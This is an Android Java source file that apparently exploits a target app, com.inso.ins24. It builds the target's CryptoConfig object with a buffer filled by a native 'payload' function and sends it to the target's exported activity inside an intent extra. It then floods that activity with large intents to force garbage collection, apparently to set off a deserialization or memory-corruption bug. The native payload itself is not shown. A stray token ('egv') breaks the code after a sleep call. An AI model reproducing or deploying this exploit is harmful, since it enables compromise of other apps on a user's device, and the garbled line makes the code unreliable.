package com.example.myapplication;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.inso.ins24.utils.CryptoConfig;
import com.inso.ins24.utils.JSONBuilder;

public class MainActivity extends AppCompatActivity {
    public static final ComponentName COMPONENT = new ComponentName("com.inso.ins24", "com.inso.ins24.MainActivity");

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        Log.e("hui", "Entering MainActivity.onCreate()");

        super.onCreate(savedInstanceState);

        final CryptoConfig cryptoConfig = new CryptoConfig();
        cryptoConfig.IN = "";
        cryptoConfig.ALGO = new byte[1024];
        Log.e("hui", "Calling MainActivity.payload()");
        payload(cryptoConfig.ALGO);

        final JSONBuilder jsonBuilder = new JSONBuilder();
        jsonBuilder.data = cryptoConfig;

        final Intent intent = new Intent();
        intent.setComponent(COMPONENT);
        intent.putExtra("exit", jsonBuilder);
        startActivity(intent);

        triggerGC();
    }

    private void triggerGC() {
        new Thread(() -> {
            try {
                Thread.sleep(1000);egv
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
            runOnUiThread(() -> {
                Intent intent = new Intent();
                intent.setComponent(COMPONENT);
                intent.putExtra("exit", new byte[100000]);
                startActivity(intent);
                triggerGC();
            });
        }).start();
    }

    public static native void payload(byte[] data);

    static {
        System.loadLibrary("myapplication");
    }
}
